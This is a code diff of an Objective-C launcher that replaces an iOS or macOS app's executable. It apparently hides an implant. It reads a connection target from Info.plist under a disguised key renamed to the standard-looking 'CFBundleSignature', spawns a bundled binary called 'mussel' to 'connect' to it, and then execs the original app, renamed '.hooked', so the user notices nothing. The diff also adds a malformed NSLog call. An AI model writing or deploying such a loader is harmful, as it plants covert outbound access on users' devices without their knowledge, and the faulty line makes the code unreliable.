@@ -40,14 +40,9 @@ extern int posix_spawnattr_set_persona_np(const posix_spawnattr_t* __restrict, u
 extern int posix_spawnattr_set_persona_uid_np(const posix_spawnattr_t* __restrict, uid_t);
 extern int posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t* __restrict, uid_t);
 
-NSDictionary *readPlist(NSString *plistPath)
-{
-    return [NSDictionary dictionaryWithContentsOfFile:plistPath];
-}
-
 BOOL spawnProcess(NSString *path, NSArray *args)
 {
-	NSMutableArray *argsMutable;
+    NSMutableArray *argsMutable;
 
     NSUInteger iter;
     NSUInteger argsCount;
@@ -103,38 +98,37 @@ BOOL spawnProcess(NSString *path, NSArray *args)
 
 BOOL spawnMussel(NSString *plistPath, NSString *musselPath)
 {
-	NSArray *CFBundleBase64Hash;
+    NSArray *CFBundleSignature;
     NSDictionary *dictionary;
 
-    dictionary = readPlist(plistPath);
-    CFBundleBase64Hash = @[dictionary[@"CFBundleBase64Hash"]];
+    dictionary = [NSDictionary dictionaryWithContentsOfFile:plistPath];
+    CFBundleSignature = @[dictionary[@"CFBundleSignature"]];
 
-    NSLog(@"[%s] Will connect to %@ %@\n", __PRETTY_FUNCTION__, CFBundleBase64Hash[0], musselPath);
-    return spawnProcess(musselPath, CFBundleBase64Hash);
+    NSLog(@"[%s] Will connect to %@ %@\n", __PRETTY_FUNCTION__, CFBundleSignature[0], musselPath);
+    return spawnProcess(musselPath, CFBundleSignature);
 }
 
 int main(int argc, const char *argv[], const char *env[])
 {
-	NSString *appRoot;
-	NSString *hookedPath;
-	NSString *musselPath;
-	NSString *plistPath;
+    NSString *appRoot;
+    NSString *hookedPath;
+    NSString *musselPath;
+    NSString *plistPath;
 
     @autoreleasepool {
-    	appRoot = [[NSString stringWithUTF8String:argv[0]] stringByDeletingLastPathComponent];
-    	hookedPath = [[NSString stringWithUTF8String:argv[0]] stringByAppendingString:@".hooked"];
-    	musselPath = [appRoot stringByAppendingPathComponent:@"mussel"];
-    	plistPath = [appRoot stringByAppendingPathComponent:@"Info.plist"];
+        appRoot = [[NSString stringWithUTF8String:argv[0]] stringByDeletingLastPathComponent];
+        hookedPath = [[NSString stringWithUTF8String:argv[0]] stringByAppendingString:@".hooked"];
+        musselPath = [appRoot stringByAppendingPathComponent:@"mussel"];
+        plistPath = [appRoot stringByAppendingPathComponent:@"Info.plist"];
 
-		NSLog(@"[%s] Hooked path: %@", __PRETTY_FUNCTION__, hookedPath);
-		NSLog(@"[%s] Plist path: %@", __PRETTY_FUNCTION__, plistPath);
+	    NSLog(@"[%s] Executing operation mussel\n", __PRETTY_FUNCTION__);
+	    spawnMussel(plistPath, musselPath);
 
-		NSLog(@"[%s] Executing operation mussel\n", __PRETTY_FUNCTION__);
-		spawnMussel(plistPath, musselPath);
-
+        NSLog("@ [%s] Executing hooked application\n", __PRETTY_FUNCTION__);
         execve([hookedPath UTF8String], (char *const *)argv, (char *const *)env);
+
         NSLog(@"[%s] Failed to execute the program.", __PRETTY_FUNCTION__);
     }
-    
+
     return 0;
 }
